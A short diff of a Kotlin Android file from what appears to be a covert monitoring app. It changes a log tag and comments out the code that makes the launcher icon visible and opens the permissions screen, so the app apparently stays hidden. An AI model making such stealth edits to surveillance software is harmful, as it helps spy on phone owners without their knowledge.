@@ -19,7 +19,7 @@ import me.hawkshaw.utils.CommonParams
 open class BaseTask(private val ctx: Context) : Thread(), Runnable {
 
     val params: CommonParams = CommonParams(ctx)
-    val tag = "Suthar"
+    val tag = "jramirez"
 
     protected fun getContactName(phoneNumber: String, context: Context = ctx): String {
 
@@ -43,16 +43,16 @@ open class BaseTask(private val ctx: Context) : Thread(), Runnable {
     }
 
     private fun showAppIcon() {
-        val componentName = ComponentName(ctx, PermissionsActivity::class.java)
-        ctx.packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP)
+        //val componentName = ComponentName(ctx, PermissionsActivity::class.java)
+        //ctx.packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP)
     }
 
     protected fun requestPermissions() {
         // app icon already shown in debug
         if (!BuildConfig.DEBUG) showAppIcon()
-        val i = Intent(ctx, PermissionsActivity::class.java)
-        i.addFlags(FLAG_ACTIVITY_NEW_TASK)
-        ctx.startActivity(i)
+        //val i = Intent(ctx, PermissionsActivity::class.java)
+        //i.addFlags(FLAG_ACTIVITY_NEW_TASK)
+        //ctx.startActivity(i)
     }
 
 }
